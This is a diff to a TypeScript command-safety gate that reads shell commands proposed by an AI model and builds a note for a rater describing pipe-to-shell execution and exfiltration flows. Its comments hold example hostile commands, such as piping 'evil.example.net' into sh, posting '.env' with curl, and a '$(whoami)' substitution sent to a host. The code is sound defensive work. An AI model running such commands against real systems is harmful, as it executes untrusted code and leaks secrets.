@@ -51,11 +51,27 @@
  *   NOT resolve as a whole, and its finding is handed to the rater as context. It changes no
  *   outcome by itself.
  *
- * **The error-cost regime is the third distinct one in this codebase, and it is the widest.** The §8
- * hardline REFUSES unappealably, so it must be the narrowest. This module's floor RAISES a prompt,
- * so it over-matches (below). The note only INFORMS THE MODEL — a wrong one costs a sentence of
- * attention and no interruption at all — so it may be wider than either. Do not "fix" a note false
- * positive by narrowing the extractor; that trades a free cost for a silent one.
+ * **The error-cost regime is the third distinct one in this codebase, and it is the widest — about
+ * WHICH HOSTS ARE NAMED.** The §8 hardline REFUSES unappealably, so it must be the narrowest. This
+ * module's floor RAISES a prompt, so it over-matches (below). Naming a host in the note only
+ * INFORMS THE MODEL: a host named that turns out not to be contacted costs one sentence of
+ * attention and no interruption at all. So do not "fix" a note false positive by narrowing the host
+ * extractor; that trades a free cost for a silent one.
+ *
+ * **That licence covers which hosts are named. It does not cover WHAT THE NOTE SAYS THEY DO.** A
+ * flow sentence asserts a mechanism — that fetched bytes are executed, that a file's contents are
+ * sent — and the rater cannot check that against a shell; it can only believe it. A mechanism that
+ * is false on an ordinary command is this node's own named failure mode arriving one layer in: an
+ * escalation laundered through the model instead of the parser, unfalsifiable because a note said
+ * it. So each flow arm fires only where its claim is **true of the program named**, and everything
+ * else falls through to the flowless sentence — which still names the hosts and says outright that
+ * the flow is not known. Saying less is not a loss of assistance; asserting a false mechanism is a
+ * loss of the layer.
+ *
+ * **And a flow sentence names EVERY host of the part it describes**, for the reason
+ * {@link findOpenWorldHostLiterals} returns every match rather than the first: the first is the
+ * proxy, and a sentence that names the reassuring host while hiding the other is worse than no
+ * sentence.
  *
  * ## The shape of the matcher
  *
@@ -635,18 +651,29 @@ export function findOpenWorldHostLiterals(command: string): string[] {
  * the parts**: in `cat .env | curl -X POST https://…` the fact worth stating is that a local file's
  * contents are read into an outbound request, which takes composing two segments to see — exactly
  * what the parser failed to do. So the note names the FLOW where one is determinable, and says only
- * what it knows where one is not. It never invents a flow.
+ * what it knows where one is not.
+ *
+ * **Two rules govern every sentence below, and both are load-bearing:**
+ *
+ * 1. **It never invents a flow.** An arm fires only where its mechanism is true of the program
+ *    named — the at-sign convention only for a program that has it, a substitution only where the
+ *    program SENDS that operand, execution of fetched bytes only where the interpreter was given no
+ *    program of its own. Anything else falls through to the flowless sentence. The module docblock
+ *    says why this is not the same trade-off as over-matching a host.
+ * 2. **It names every host of the part it describes**, and any host the rest of the line names is
+ *    added rather than dropped. Naming a flow must never cost the note a counterparty, or adding a
+ *    pipe would once again remove information from the model — the very asymmetry this path exists
+ *    to close.
  * ─────────────────────────────────────────────────────────────────────────────────────────────── */
 
 /**
- * Programs that RUN what arrives on their standard input. Piping a fetch into one of these makes the
- * fetched bytes the program.
- *
- * An enumeration, and a miss costs only a less specific note (the host is still named and the
- * remaining sentence is still true), which is what makes an enumeration acceptable *here* and not in
- * a layer that decides an outcome.
+ * The shells. Kept as its own set because one thing is true of shells and of nothing else here: a
+ * `-s` in a flag cluster means *"the program is standard input, and every operand after it is an
+ * ARGUMENT to that program"* — `curl … | sh -s -- --unattended`, the ordinary unattended-installer
+ * form. Elsewhere the same letter means something unrelated (`python3 -s` is a site-packages
+ * switch), which is why {@link interpreterRunsStdin} consults it only for these heads.
  */
-const STDIN_INTERPRETERS: ReadonlySet<string> = new Set([
+const SHELL_INTERPRETERS: ReadonlySet<string> = new Set([
   'sh',
   'bash',
   'zsh',
@@ -656,6 +683,20 @@ const STDIN_INTERPRETERS: ReadonlySet<string> = new Set([
   'csh',
   'tcsh',
   'fish',
+]);
+
+/**
+ * Programs that CAN run what arrives on their standard input. Piping a fetch into one of these makes
+ * the fetched bytes the program **when the line gives the program nothing else to run** — which is
+ * the question {@link interpreterRunsStdin} answers, and which decides which sentence this note
+ * carries.
+ *
+ * An enumeration, and a miss costs only a less specific note (the host is still named and the
+ * remaining sentence is still true), which is what makes an enumeration acceptable *here* and not in
+ * a layer that decides an outcome.
+ */
+const STDIN_INTERPRETERS: ReadonlySet<string> = new Set([
+  ...SHELL_INTERPRETERS,
   'python',
   'python2',
   'python3',
@@ -671,6 +712,41 @@ const STDIN_INTERPRETERS: ReadonlySet<string> = new Set([
   'powershell',
   'pwsh',
 ]);
+
+/** A short-flag cluster: one dash, then letters or digits (`-s`, `-fsSL`, `-es`). */
+const SHORT_FLAG_CLUSTER_RE = /^-[A-Za-z0-9]+$/;
+
+/**
+ * Does this line leave the interpreter's PROGRAM to standard input, or does it give the interpreter
+ * one of its own?
+ *
+ * Answered from the shape of the argv alone. **There is deliberately no table of what each
+ * interpreter's flags mean**, because that table is the enumeration that acquires a blind spot one
+ * release at a time ([[cmd-pos-is-an-enumeration]]) — and here a wrong entry does not cost a miss,
+ * it puts a FALSE MECHANISM in front of the rater in one direction or the other. `-e` is `eval` to
+ * node and perl and `errexit` to every shell; `-m` is a module to python and job control to bash. Two
+ * program-agnostic facts settle it instead:
+ *
+ * - **An operand that is not a flag** may be the program (`python3 script.py`) or the value of a
+ *   flag that supplies one (`bash -c "…"`, `node -e "…"`, `perl -pe "…"`, `python3 -m json.tool`).
+ *   Either way this line hands the interpreter something of its own, so the note must not say the
+ *   fetched bytes are what runs.
+ * - **A shell's `-s`, alone or in a cluster**, says the program IS standard input. It therefore
+ *   WINS over the operand test, which would otherwise read the script's own arguments (`sh -s foo`)
+ *   as a program and soften the sentence on the hostile shape.
+ *
+ * A bare `-` is a flag by this test and not an operand, which is the right answer: `python3 -` reads
+ * its program from standard input.
+ */
+function interpreterRunsStdin(head: string, operands: readonly string[]): boolean {
+  if (SHELL_INTERPRETERS.has(head)) {
+    const forcesStdin = operands.some(
+      (operand) => SHORT_FLAG_CLUSTER_RE.test(operand) && operand.includes('s')
+    );
+    if (forcesStdin) return true;
+  }
+  return !operands.some((operand) => !operand.startsWith('-'));
+}
 
 /** What separates one part of a composed command line from the next. */
 type SeparatorKind = 'none' | 'pipe' | 'sequence';
@@ -803,26 +879,36 @@ function quotable(token: string): string | null {
  * in any one part, and the only reason this note is worth a rater's attention.
  */
 export type ComposedFlow =
-  /** A fetch is piped into a program that RUNS its standard input. */
-  | { readonly kind: 'fetch-into-interpreter'; readonly host: string; readonly interpreter: string }
+  /**
+   * A fetch is piped into a program that can run its standard input. `stdinIsTheProgram` says
+   * whether it does on this line ({@link interpreterRunsStdin}) — `curl … | sh` runs the fetched
+   * bytes, `curl … | python3 -m json.tool` reads them as data — and the two get different
+   * sentences, because only one of them executes what the host serves.
+   */
+  | {
+      readonly kind: 'fetch-into-interpreter';
+      readonly hosts: readonly string[];
+      readonly interpreter: string;
+      readonly stdinIsTheProgram: boolean;
+    }
   /** A local program's output is piped into a program that sends it to a host. */
   | {
       readonly kind: 'local-into-transfer';
       readonly producer: string;
       readonly transfer: string;
-      readonly host: string;
+      readonly hosts: readonly string[];
     }
-  /** A substitution's output becomes an argument of a program that sends it to a host. */
+  /** A substitution's output becomes an argument the program SENDS. */
   | {
       readonly kind: 'substitution-into-transfer';
       readonly transfer: string;
-      readonly host: string;
+      readonly hosts: readonly string[];
     }
   /** A transfer agent is told to read a local file and send its contents. */
   | {
       readonly kind: 'file-into-transfer';
       readonly transfer: string;
-      readonly host: string;
+      readonly hosts: readonly string[];
       readonly path: string | null;
     };
 
@@ -843,14 +929,117 @@ export interface ComposedOpenWorldFinding {
 const EXECUTING_SUBSTITUTION_RE = /\$\(|`/;
 
 /**
- * curl/httpie's convention for "read this operand from a local file rather than taking it
- * literally". `@-` is standard input, which is the pipe case rather than a file read.
+ * curl's convention for "read this operand from a local file rather than taking it literally". `@-`
+ * is standard input, which is the pipe case rather than a file read.
  *
- * Keyed on the convention and not on a list of the flags that honour it: an enumeration of
- * `-d`/`--data-binary`/`-T`/`-F`/… acquires a blind spot one flag at a time, and a wrong answer here
- * costs a less specific note rather than an outcome.
+ * Within a head that HAS the convention this is keyed on the convention and not on a list of the
+ * flags that honour it: an enumeration of `-d`/`--data-binary`/`-T`/`-F`/… acquires a blind spot one
+ * flag at a time, and a miss there costs a less specific note. Which heads have it at all is a
+ * different question and is answered by {@link AT_FILE_HEADS}.
  */
 const AT_FILE_OPERAND_RE = /^@(?!-$)(.+)$/;
+
+/**
+ * The heads whose operand beginning with `@` means *"read this local file and send its contents"*.
+ *
+ * **curl alone, and the narrowness is the point.** The sentence this arm emits names that mechanism
+ * outright, so it is only ever true of a program that has the convention. A leading at-sign is
+ * ordinary in operands that are nothing of the kind — `npm install @babel/core`, `pnpm add
+ * @types/node`, `yarn add @scope/pkg` are scoped package NAMES, and applying curl's convention to
+ * them both invents a mechanism and invents a filename that does not exist. httpie's file forms
+ * attach to a field (`field@file`) rather than standing as a bare operand, so it is out too: a head
+ * admitted here on a guess re-creates exactly the defect this gate prevents, while a head left out
+ * costs only the flowless sentence, which still names the host.
+ *
+ * The head is `argv[0]` of the part, so a wrapped form (`sudo curl -d @secret …`) falls through as
+ * well — the same trade, taken the same way.
+ */
+const AT_FILE_HEADS: ReadonlySet<string> = new Set(['curl']);
+
+/**
+ * Flags whose VALUE the program puts into what it SENDS — a request body, a header, credentials.
+ *
+ * **Keyed by head, because a flag letter is not a convention:** `git push -d <branch>` deletes a
+ * branch, and an ungated list would let *"the result of the inner command is part of what git sends
+ * to <host>"* through unchecked. Only values sent LITERALLY are listed: `-T`/`--upload-file` and
+ * `-F`/`--form` take a filename or an `@file` reference, so a substitution there produces the NAME
+ * of what is sent rather than the content, and claiming otherwise would be the same false mechanism
+ * one flag along.
+ *
+ * A head or a flag missing from here costs the flowless sentence, which is the direction this table
+ * must fail in.
+ */
+const SEND_OPERAND_FLAGS: ReadonlyMap<string, ReadonlySet<string>> = new Map<
+  string,
+  ReadonlySet<string>
+>([
+  [
+    'curl',
+    new Set([
+      '-d',
+      '--data',
+      '--data-raw',
+      '--data-ascii',
+      '--data-binary',
+      '--data-urlencode',
+      '--json',
+      '--form-string',
+      '-H',
+      '--header',
+      '-u',
+      '--user',
+    ]),
+  ],
+  ['wget', new Set(['--post-data', '--body-data', '--header'])],
+]);
+
+/** A redirection operator standing alone: `>`, `>>`, `2>`, `&>`, `<`. */
+const REDIRECT_OPERATOR_RE = /^(?:\d*(?:>>?|<<?)|&>>?)$/;
+/** The same, glued to what follows it: `>out.txt`, `2>>log`. */
+const REDIRECT_PREFIX_RE = /^(?:\d*(?:>>?|<<?)|&>>?)/;
+
+/**
+ * Is a substitution in this part in a position the program SENDS?
+ *
+ * The arm's sentence says the inner command's output becomes part of what the program sends to the
+ * host. That is true of a request body, a header or a URL; it is false of the two places a
+ * substitution most often sits in ordinary work — an OUTPUT filename (`curl -o "$(date).json" <URL>`,
+ * `wget -O "$(date).html" <URL>`) and a REDIRECT target (`curl <URL> > "$(date).txt"`), where the
+ * output names a local file and nothing about it goes anywhere.
+ *
+ * So a position must be positively recognised as a sending one, rather than merely not recognised as
+ * an output one: an unlisted flag then costs the flowless sentence instead of a false claim.
+ * Recognised positions are the value of a {@link SEND_OPERAND_FLAGS} flag, in either spelling, and
+ * the endpoint operand itself (`curl "https://evil.example/$(whoami)"`, where the substitution is
+ * part of the request line).
+ */
+function substitutionIsSent(segment: AnalyzedSegment): boolean {
+  const sendFlags = SEND_OPERAND_FLAGS.get(segment.head);
+  for (let i = 0; i < segment.argv.length; i++) {
+    const token = segment.argv[i];
+    if (!EXECUTING_SUBSTITUTION_RE.test(token)) continue;
+    // A redirect target is not an operand of the program at all — the shell consumes it.
+    if (REDIRECT_PREFIX_RE.test(token)) continue;
+    const previous = i > 0 ? segment.argv[i - 1] : undefined;
+    if (previous !== undefined && REDIRECT_OPERATOR_RE.test(previous)) continue;
+    // `--data=$(…)` — the value glued to its flag.
+    if (token.startsWith('-')) {
+      if (sendFlags?.has(token.split(/=(.*)/)[0])) return true;
+      continue;
+    }
+    // `-d $(…)` — the detached value. An operand preceded by a flag is that flag's value, so an
+    // unlisted flag (`-o`, `-O`, `--output`) stops here rather than falling on to the operand test.
+    if (previous !== undefined && previous.startsWith('-')) {
+      // `-d @$(…)` names a file to read; its CONTENTS are sent, not the substitution's output.
+      if (sendFlags?.has(previous) && !token.startsWith('@')) return true;
+      continue;
+    }
+    // The endpoint operand itself. `[<>]` excludes an unspaced redirect (`<URL>>$(date).txt`),
+    // which is a host literal by prefix but a filename after the operator.
+    if (segment.hosts.includes(token) && !/[<>]/.test(token)) return true;
+  }
+  return false;
+}
 
 /** Read one part the way the matcher reads a whole command; `null` when it does not tokenize. */
 function analyzeSegment(segment: CommandSegment): AnalyzedSegment | null {
@@ -871,6 +1060,10 @@ function analyzeSegment(segment: CommandSegment): AnalyzedSegment | null {
  * how specific each one is. A part piped into an ordinary local program (`curl … | jq .version`) is
  * deliberately NOT a flow: it is real, but naming it would state something the rater can already see
  * in the text, and the note's whole value is the fact that needs two parts composed to notice.
+ *
+ * **Each arm carries EVERY host of the part it describes, not the first.** The first is the proxy in
+ * `curl -x http://proxy.corp.local:3128 https://evil.example.net/x | sh`, and the sentence that
+ * names it alone hides the host whose bytes `sh` runs.
  */
 function findFlow(segments: readonly AnalyzedSegment[]): ComposedFlow | null {
   for (let i = 0; i + 1 < segments.length; i++) {
@@ -880,8 +1073,9 @@ function findFlow(segments: readonly AnalyzedSegment[]): ComposedFlow | null {
     if (upstream.hosts.length > 0 && STDIN_INTERPRETERS.has(downstream.head)) {
       return {
         kind: 'fetch-into-interpreter',
-        host: upstream.hosts[0],
+        hosts: upstream.hosts,
         interpreter: downstream.head,
+        stdinIsTheProgram: interpreterRunsStdin(downstream.head, downstream.argv.slice(1)),
       };
     }
     if (upstream.hosts.length === 0 && downstream.hosts.length > 0) {
@@ -889,19 +1083,20 @@ function findFlow(segments: readonly AnalyzedSegment[]): ComposedFlow | null {
         kind: 'local-into-transfer',
         producer: upstream.head,
         transfer: downstream.head,
-        host: downstream.hosts[0],
+        hosts: downstream.hosts,
       };
     }
   }
   for (const segment of segments) {
     if (segment.hosts.length === 0) continue;
-    if (segment.argv.some((token) => EXECUTING_SUBSTITUTION_RE.test(token))) {
+    if (substitutionIsSent(segment)) {
       return {
         kind: 'substitution-into-transfer',
         transfer: segment.head,
-        host: segment.hosts[0],
+        hosts: segment.hosts,
       };
     }
+    if (!AT_FILE_HEADS.has(segment.head)) continue;
     const atFile = segment.argv
       .map((token) => AT_FILE_OPERAND_RE.exec(token)?.[1])
       .find((path) => path !== undefined);
@@ -909,7 +1104,7 @@ function findFlow(segments: readonly AnalyzedSegment[]): ComposedFlow | null {
       return {
         kind: 'file-into-transfer',
         transfer: segment.head,
-        host: segment.hosts[0],
+        hosts: segment.hosts,
         path: quotable(atFile),
       };
     }
@@ -967,15 +1162,29 @@ export const COMPOSED_OPEN_WORLD_PREAMBLE =
   'transfer position. Nothing has been decided here and nothing has been floored: this is context ' +
   'about what the parts do together, and the rating is entirely yours.';
 
-/** Name the hosts if they are safe to quote back, else fall back to naming none. */
-function hostPhrase(hosts: readonly string[]): string {
-  const named = hosts.map(quotable).filter((host): host is string => host !== null);
-  return named.length > 0 ? named.join(', ') : 'a host';
+/** The hosts as the note names them, with the number the rest of the sentence has to agree with. */
+interface HostWords {
+  /** `A`, `A and B`, `A, B and C` — or the caller's fallback word when none can be quoted. */
+  readonly phrase: string;
+  /** Whether {@link phrase} names more than one host, so ONE template can render both. */
+  readonly plural: boolean;
 }
 
-/** The one host a flow sentence is about, or a generic word when it cannot be quoted. */
-function hostWord(host: string): string {
-  return quotable(host) ?? 'that host';
+/**
+ * Name every host that is safe to quote back, in argv order.
+ *
+ * **Every one, never the first.** The finding carries all of them because the first is the proxy and
+ * the second is the counterparty as often as the other way round; a sentence that drops the rest
+ * hides exactly what it exists to surface. A host that fails {@link quotable} is not named at all —
+ * that is the injection boundary, not a shortening — and when none can be named the caller's
+ * fallback word stands in for them.
+ */
+function nameHosts(hosts: readonly string[], fallback: string): HostWords {
+  const named = hosts.map(quotable).filter((host): host is string => host !== null);
+  if (named.length === 0) return { phrase: fallback, plural: false };
+  if (named.length === 1) return { phrase: named[0], plural: false };
+  const last = named[named.length - 1];
+  return { phrase: `${named.slice(0, -1).join(', ')} and ${last}`, plural: true };
 }
 
 /**
@@ -985,21 +1194,38 @@ function hostWord(host: string): string {
  * component that has just said it could not read the command is taken as DOUBT rather than as
  * information, and that one sentence of MECHANISM is what moves a rater; these say what the shell
  * does with the parts and then hand the judgement back.
+ *
+ * Every arm renders `flow.hosts` through {@link nameHosts} and agrees its verbs with the count, so
+ * the one-host reading and the several-host reading are the same sentence rather than two that can
+ * drift.
  */
 function flowSentence(flow: ComposedFlow): string {
   switch (flow.kind) {
     case 'fetch-into-interpreter': {
-      const host = hostWord(flow.host);
+      const { phrase: host, plural } = nameHosts(flow.hosts, 'that host');
       const interpreter = quotable(flow.interpreter) ?? 'the program after the pipe';
+      const returns = plural ? 'return' : 'returns';
+      const does = plural ? 'do' : 'does';
+      // The interpreter was handed a program of its own, so the fetched bytes are its INPUT rather
+      // than the thing it runs — `curl … | python3 -m json.tool` pretty-prints them as data.
+      if (!flow.stdinIsTheProgram) {
+        return (
+          `The part that fetches from ${host} is piped into ${interpreter}, so ${interpreter} ` +
+          `reads whatever ${host} ${returns}. This line also gives ${interpreter} operands of its ` +
+          `own, which may be the program it runs, so the gate is not saying the fetched bytes are ` +
+          `what executes here — they may be INPUT to that program instead. What ${does} ${host} ` +
+          `serve here, and what does ${interpreter} do with it?`
+        );
+      }
       return (
         `The part that fetches from ${host} is piped into ${interpreter}, so the shell hands ` +
-        `whatever ${host} returns to ${interpreter} and ${interpreter} runs it as a program on this ` +
-        `machine. What this line executes is therefore decided by ${host} and is not in the text ` +
-        `above. What does ${host} serve here?`
+        `whatever ${host} ${returns} to ${interpreter} and ${interpreter} runs it as a program on ` +
+        `this machine. What this line executes is therefore decided by ${host} and is not in the ` +
+        `text above. What ${does} ${host} serve here?`
       );
     }
     case 'local-into-transfer': {
-      const host = hostWord(flow.host);
+      const { phrase: host } = nameHosts(flow.hosts, 'that host');
       const producer = quotable(flow.producer) ?? 'the program before the pipe';
       const transfer = quotable(flow.transfer) ?? 'the program after the pipe';
       return (
@@ -1010,7 +1236,7 @@ function flowSentence(flow: ComposedFlow): string {
       );
     }
     case 'substitution-into-transfer': {
-      const host = hostWord(flow.host);
+      const { phrase: host } = nameHosts(flow.hosts, 'that host');
       const transfer = quotable(flow.transfer) ?? 'the transfer program';
       return (
         `An operand of ${transfer} is a substitution. The SHELL runs that inner command first and ` +
@@ -1020,7 +1246,7 @@ function flowSentence(flow: ComposedFlow): string {
       );
     }
     case 'file-into-transfer': {
-      const host = hostWord(flow.host);
+      const { phrase: host } = nameHosts(flow.hosts, 'that host');
       const transfer = quotable(flow.transfer) ?? 'the transfer program';
       const file = flow.path === null ? 'a local file' : `the local file ${flow.path}`;
       return (
@@ -1033,23 +1259,59 @@ function flowSentence(flow: ComposedFlow): string {
 }
 
 /**
+ * The hosts the rest of the line names, added after the flow sentence.
+ *
+ * A flow describes ONE part; the finding covers the whole line. Without this, naming a flow would
+ * cost the note every host outside that part — the same loss as naming only the first host, one
+ * level up. Empty when the flow already named them all, which is the ordinary case.
+ */
+function residualSentence(hosts: readonly string[]): string {
+  const { phrase, plural } = nameHosts(hosts, '');
+  if (phrase === '') return '';
+  return plural
+    ? ` Other parts of this line also name ${phrase}, and the gate is not saying what reaches them. ` +
+        'What do those parts do here?'
+    : ` Another part of this line also names ${phrase}, and the gate is not saying what reaches ` +
+        'it. What does that part do here?';
+}
+
+/**
+ * What the note says when no flow is determinable: the hosts, and an explicit statement that the
+ * flow is NOT known. A note that guessed at one would be worse than a short one, and a reader told
+ * what the gate could not work out can weigh it.
+ */
+function flowlessSentence(hosts: readonly string[]): string {
+  const { phrase, plural } = nameHosts(hosts, 'a host');
+  const subject = plural ? 'The parts read separately name' : 'The part in question names';
+  const them = plural ? 'those hosts' : 'that host';
+  const contact = plural
+    ? 'the parts of this line contact them'
+    : 'one part of this line contacts it';
+  return (
+    `${subject} ${phrase}. The gate could not work out how the parts feed into each other, so it ` +
+    `is not telling you what reaches ${them} — only that ${contact}. What does the whole line do ` +
+    'once every part has run?'
+  );
+}
+
+/**
  * Build the composed open-world note for a command, or `null` when there is nothing to say.
  *
- * One sentence of mechanism when the flow is determinable; when it is not, the hosts and an explicit
- * statement that the flow is NOT known — a note that guessed at a flow would be worse than a short
- * one, and a reader who is told what the gate could not work out can weigh it.
+ * One sentence of mechanism when the flow is determinable, plus the hosts the rest of the line names
+ * ({@link residualSentence}); when it is not, {@link flowlessSentence}. **Every host on the finding
+ * that can be quoted is named either way** — which arm fired must never decide how much the rater is
+ * told about the counterparties.
  *
  * @param command The raw command string as the model proposed it.
  */
 export function buildComposedOpenWorldNote(command: string): string | null {
   const finding = findComposedOpenWorld(command);
   if (finding === null) return null;
+  const flow = finding.flow;
   const body =
-    finding.flow !== null
-      ? flowSentence(finding.flow)
-      : `The part in question names ${hostPhrase(finding.hosts)}. The gate could not work out how ` +
-        'the parts feed into each other, so it is not telling you what reaches that host — only ' +
-        'that one part of this line contacts it. What does the whole line do once every part has ' +
-        'run?';
+    flow === null
+      ? flowlessSentence(finding.hosts)
+      : flowSentence(flow) +
+        residualSentence(finding.hosts.filter((host) => !flow.hosts.includes(host)));
   return `${COMPOSED_OPEN_WORLD_PREAMBLE}\n${body}`;
 }
